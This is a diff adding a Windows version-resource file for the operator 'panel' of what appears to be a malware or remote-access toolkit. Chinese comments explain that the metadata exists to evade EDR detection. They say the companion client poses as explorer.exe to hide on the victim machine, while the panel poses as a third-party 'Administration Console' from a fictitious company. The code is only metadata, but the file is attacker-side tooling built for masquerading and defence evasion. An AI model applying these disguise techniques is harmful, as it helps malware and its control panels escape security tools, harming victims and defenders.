@@ -1,0 +1,47 @@
+// panel_version.rc —— 面板版本信息 / 字符串资源
+//
+// 为什么面板也需要（与 client 同理）：
+//   没有任何版本信息的 GUI exe 在 EDR 侧是**加分项**的可疑特征 ——
+//   正常桌面程序都带厂商与产品名。面板是操作者天天双击运行的东西，
+//   一个"三无"exe 反而比一个自称某公司产品的 exe 更容易被拦。
+//
+// 本文件必须保持纯 ASCII（rc 对编码敏感），且字符串值里**不要**写 C 转义引号
+// ——实测：值里出现 \" 会让 rc 静默产出空 .res（908 字节，只有一个 null 条目）。
+//
+// ⚠️ 与 client/src/r6m_version.rc 的区别：
+//   客户端的版本信息伪装成系统组件（explorer.exe）—— 它要藏在受害机里。
+//   面板**不能**伪装成系统组件：它在操作者机器上以 GUI 形态可见，冒充 explorer
+//   在任务栏里更可疑。这里用一个普通第三方工具的身份，并且与窗口标题一致。
+
+#include <winver.h>
+
+#define PANEL_VER_STR "1.4.2.0"
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION    1,4,2,0
+ PRODUCTVERSION 1,4,2,0
+ FILEFLAGSMASK  0x3fL
+ FILEFLAGS      0x0L
+ FILEOS         VOS_NT_WINDOWS32
+ FILETYPE       VFT_APP
+ FILESUBTYPE    VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "Example Software Ltd."
+            VALUE "FileDescription",  "Administration Console"
+            VALUE "FileVersion",      PANEL_VER_STR
+            VALUE "InternalName",     "console"
+            VALUE "LegalCopyright",   "Copyright (C) 2026 Example Software Ltd."
+            VALUE "OriginalFilename", "console.exe"
+            VALUE "ProductName",      "Administration Console"
+            VALUE "ProductVersion",   PANEL_VER_STR
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
